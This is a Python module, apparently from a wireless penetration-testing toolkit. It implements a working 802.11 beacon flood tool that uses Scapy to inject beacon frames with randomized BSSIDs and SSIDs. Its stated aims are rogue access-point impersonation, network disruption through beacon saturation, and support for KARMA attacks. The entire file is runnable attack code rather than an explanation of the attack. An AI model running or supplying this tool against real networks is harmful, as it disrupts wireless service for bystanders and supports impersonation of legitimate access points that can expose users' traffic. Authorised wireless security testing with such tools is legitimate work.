"""
Beacon Flood Attack
===================
802.11 beacon frame flooding for network disruption and AP impersonation.

Generates randomized beacon frames with configurable SSID patterns,
encryption types, and transmission rates. Used for:
- AP impersonation / rogue beacon injection
- Network disruption via beacon saturation
- KARMA attack support (responsive SSIDs)
"""

import random
import string
import threading
import time
from typing import Optional, List, Dict, Any


class BeaconFlooder:
    """802.11 beacon frame injection engine."""

    def __init__(self, iface: str):
        self.iface = iface
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats: Dict[str, Any] = {
            "beacons_sent": 0,
            "start_time": None,
            "ssid_list": [],
        }
        self._default_rates = [0x02, 0x04, 0x0b, 0x16]

    def _random_mac(self) -> str:
        """Generate a random MAC address."""
        return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

    def _random_ssid(self, length: int = 8) -> str:
        """Generate a random SSID string."""
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    def _build_beacon(self, ssid: str, bssid: str, channel: int = 1) -> Any:
        """Construct a Scapy 802.11 beacon frame."""
        try:
            from scapy.all import (
                Dot11, Dot11Beacon, Dot11Elt, RadioTap,
                SSIDParamSet, Rates, DSset, TIM
            )
            from scapy.layers.dot11 import Dot11FCS

            frame = (
                RadioTap()
                / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                        addr2=bssid, addr3=bssid)
                / Dot11Beacon(cap=0x2104)
                / Dot11Elt(ID="SSID", info=ssid.encode())
                / Dot11Elt(ID="Rates", info=bytes(self._default_rates))
                / Dot11Elt(ID="DSset", info=chr(channel).encode())
            )
            return frame
        except Exception as e:
            print(f"[Beacon] Frame build error: {e}")
            return None

    def start(self, ssids: Optional[List[str]] = None, count: int = 0,
              interval: float = 0.1, channel: int = 1) -> bool:
        """
        Start beacon flood attack.

        Args:
            ssids: List of SSIDs to broadcast (random if None)
            count: Number of beacons to send (0 = infinite)
            interval: Delay between beacons in seconds
            channel: Target channel for DS parameter

        Returns:
            True if attack started successfully
        """
        if ssids is None:
            ssids = [self._random_ssid() for _ in range(10)]

        self.stats["ssid_list"] = ssids
        self.stats["start_time"] = time.time()
        self._running = True
        self._thread = threading.Thread(
            target=self._flood_loop,
            args=(ssids, count, interval, channel),
            daemon=True,
        )
        self._thread.start()
        return True

    def _flood_loop(self, ssids: List[str], count: int,
                    interval: float, channel: int) -> None:
        """Main beacon transmission loop."""
        try:
            from scapy.all import sendp
            sent = 0
            while self._running and (count == 0 or sent < count):
                for ssid in ssids:
                    if not self._running:
                        break
                    bssid = self._random_mac()
                    frame = self._build_beacon(ssid, bssid, channel)
                    if frame:
                        sendp(frame, iface=self.iface, verbose=0)
                        self.stats["beacons_sent"] += 1
                        sent += 1
                    time.sleep(interval)
        except Exception as e:
            print(f"[Beacon] Flood loop error: {e}")

    def stop(self) -> None:
        """Stop beacon flood attack."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, Any]:
        """Return current attack statistics."""
        runtime = 0.0
        if self.stats["start_time"]:
            runtime = time.time() - self.stats["start_time"]
        return {
            **self.stats,
            "runtime": round(runtime, 1),
            "running": self._running,
            "rate": round(self.stats["beacons_sent"] / max(runtime, 0.1), 1),
        }
